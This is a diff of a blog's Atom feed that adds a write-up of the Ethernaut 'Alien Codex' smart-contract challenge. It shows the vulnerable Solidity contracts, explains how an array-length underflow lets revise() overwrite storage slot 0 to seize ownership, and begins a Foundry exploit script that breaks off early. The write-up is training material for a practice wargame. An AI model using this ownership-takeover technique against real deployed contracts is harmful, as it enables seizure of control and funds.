@@ -4,13 +4,212 @@
  <title>0o3q</title>
  <link href="https://0o3q.github.io/atom.xml" rel="self"/>
  <link href="https://0o3q.github.io/"/>
- <updated>2025-05-18T22:57:59+09:00</updated>
+ <updated>2025-06-02T16:57:04+09:00</updated>
  <id>https://0o3q.github.io</id>
  <author>
    <name>0o3q</name>
    <email>minkyu2045@ajou.ac.kr</email>
  </author>
 
+ 
+ <entry>
+   <title>[Ethernaut] Alien Codex</title>
+   <link href="https://0o3q.github.io/2025/06/02/aliencodex"/>
+   <updated>2025-06-02T00:00:00+09:00</updated>
+   <id>https://0o3q.github.io/2025/06/02/AlienCodex</id>
+   <content type="html">&lt;h1 id=&quot;analysis&quot;&gt;Analysis&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;The goal is&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Claim ownership&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// SPDX-License-Identifier: MIT
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;../helpers/Ownable-05.sol&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AlienCodex&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ownable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;bytes32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;modifier&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contacted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;makeContact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;contact&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bytes32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contacted&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;codex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contacted&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;codex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;revise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bytes32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contacted&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;codex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When first analyzing the AlienCodex contract, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;record()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;retract()&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;revise()&lt;/code&gt; functions are &lt;strong&gt;wrapped by&lt;/strong&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contacted()&lt;/code&gt; modifier.&lt;/p&gt;
+
+&lt;p&gt;Therefore, we must call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;makeContact()&lt;/code&gt; function first to set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contact&lt;/code&gt; variable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/**
+ * @dev Contract module which provides a basic access control mechanism, where
+ * there is an account (an owner) that can be granted exclusive access to
+ * specific functions.
+ *
+ * This module is used through inheritance. It will make available the modifier
+ * `onlyOwner`, which can be applied to your functions to restrict their use to
+ * the owner.
+ */&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ownable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;event&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OwnershipTransferred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;indexed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;previousOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;indexed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;cm&quot;&gt;/**
+     * @dev Initializes the contract setting the deployer as the initial owner.
+     */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_owner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;cm&quot;&gt;/**
+     * @dev Returns the address of the current owner.
+     */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;cm&quot;&gt;/**
+     * @dev Throws if called by any account other than the owner.
+     */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;modifier&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onlyOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Ownable: caller is not the owner&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;cm&quot;&gt;/**
+     * @dev Returns true if the caller is the current owner.
+     */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;cm&quot;&gt;/**
+     * @dev Leaves the contract without owner. It will not be possible to call
+     * `onlyOwner` functions anymore. Can only be called by the current owner.
+     *
+     * &amp;gt; Note: Renouncing ownership will leave the contract without an owner,
+     * thereby removing any functionality that is only available to the owner.
+     */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;renounceOwnership&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onlyOwner&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;emit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OwnershipTransferred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_owner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;cm&quot;&gt;/**
+     * @dev Transfers ownership of the contract to a new account (`newOwner`).
+     * Can only be called by the current owner.
+     */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;transferOwnership&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onlyOwner&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_transferOwnership&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;cm&quot;&gt;/**
+     * @dev Transfers ownership of the contract to a new account (`newOwner`).
+     */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_transferOwnership&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Ownable: new owner is the zero address&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;emit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OwnershipTransferred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_owner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next, this contract is an &lt;strong&gt;Ownable&lt;/strong&gt; contract that the AlienCodex contract inherits from. We need to overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_owner&lt;/code&gt; variable in this contract.&lt;/p&gt;
+
+&lt;p&gt;According to the &lt;a href=&quot;https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#storage-layout&quot;&gt;Solidity documentation&lt;/a&gt;, we find that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_owner&lt;/code&gt; variable in the &lt;strong&gt;Ownable&lt;/strong&gt; contract is stored at a lower storage slot than the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contact&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codex&lt;/code&gt; variables in the AlienCodex contract.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_owner&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contact&lt;/code&gt; variables are stored together in slot &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; because the combined size of these two variables does not exceed 32 bytes, &lt;strong&gt;and&lt;/strong&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codex&lt;/code&gt; variable is stored separately in slot &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;To understand how the dynamic &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bytes&lt;/code&gt; array &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codex&lt;/code&gt; stores its data, we can refer to the &lt;a href=&quot;https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#bytes-and-string&quot;&gt;Solidity documentation&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;💡 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bytes&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt; are encoded identically. In general, the encoding is similar to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bytes1[]&lt;/code&gt;, in the sense that there is a slot for the array itself and a data area that is computed using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keccak256&lt;/code&gt; hash of that slot’s position. However, for short values (shorter than 32 bytes) the array elements are stored together with the length in the same slot.&lt;/p&gt;
+
+  &lt;p&gt;In particular: if the data is at most &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;31&lt;/code&gt; bytes long, the elements are stored in the higher-order bytes (left aligned) and the lowest-order byte stores the value &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length * 2&lt;/code&gt;. For byte arrays that store data which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32&lt;/code&gt; or more bytes long, the main slot &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p&lt;/code&gt; stores &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length * 2 + 1&lt;/code&gt; and the data is stored as usual in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keccak256(p)&lt;/code&gt;. This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;When we call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;retract()&lt;/code&gt; function, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codex&lt;/code&gt; array’s length underflows from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2^256 - 1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;After this underflow, we can overwrite any storage slot by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;revise()&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;p&gt;When the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i&lt;/code&gt; argument is provided to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;revise()&lt;/code&gt;, the function computes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keccak256(abi.encode(0x1)) + i&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;If we set this equal to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, we can overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_owner&lt;/code&gt; variable in slot &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;💡 Except for dynamically-sized arrays and mappings (see below), data is stored contiguously item after item starting with the first state variable, which is stored in slot &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;exploit&quot;&gt;Exploit&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// SPDX-License-Identifier: MIT
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;forge-std/Script.sol&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AlienCodex&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;makeContact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bytes32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;revise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bytes32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AlienCodexSol&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
